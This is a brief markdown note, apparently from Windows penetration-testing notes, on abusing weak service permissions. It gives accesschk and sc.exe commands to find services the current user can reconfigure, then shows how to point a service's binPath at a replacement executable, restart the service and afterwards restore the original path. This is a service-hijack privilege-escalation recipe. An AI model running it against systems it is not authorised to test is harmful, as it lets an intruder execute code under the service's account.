# Service permissions

[← Windows services](services.md)

Need `SERVICE_CHANGE_CONFIG` on service object + usable start trigger. `SERVICE_START` and `SERVICE_STOP` are separate rights.

```powershell
whoami /groups
sc.exe qc <service-name>
accesschk.exe -accepteula -c -w -v "Authenticated Users" *
accesschk.exe -c -v <your-user-or-group> <service-name>
```

Check AccessChk against your token; save `sc.exe qc` output (`BINARY_PATH_NAME`, account, start mode).

Change config + start trigger:

```powershell
sc.exe config <service-name> binPath= "C:\Path\To\replacement.exe"
sc.exe query <service-name>
sc.exe stop <service-name>
sc.exe start <service-name>
```

Keep the space after `binPath=`. Restore exact original command line, including arguments:

```powershell
sc.exe config <service-name> binPath= "<original binary path and arguments>"
sc.exe qc <service-name>
```

Check stored path after restore; adapt quoting to original.

[Microsoft service rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) · [AccessChk syntax](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) · [`sc.exe config` syntax](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
